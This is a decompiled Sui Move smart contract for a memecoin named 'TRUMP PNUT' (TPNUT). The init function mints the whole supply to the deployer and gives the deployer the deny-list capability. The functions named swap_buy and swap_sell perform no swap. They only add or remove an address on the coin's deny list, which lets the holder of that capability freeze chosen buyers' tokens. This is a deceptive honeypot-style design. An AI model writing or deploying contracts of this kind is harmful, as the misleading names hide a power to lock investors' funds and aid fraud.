module 0x50d21ebf05126cee2220e3e7539853256a704aa57b01d74b179a46f34fde2400::tpnut {
    struct TPNUT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TPNUT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TPNUT>(arg0, 9, b"TPNUT", b"TRUMP PNUT", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmatcDjkuR986Hm2nHTx4ubCToSTxEUsmfm7iSrSqKrUZH"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TPNUT>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TPNUT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TPNUT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TPNUT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TPNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TPNUT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TPNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TPNUT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

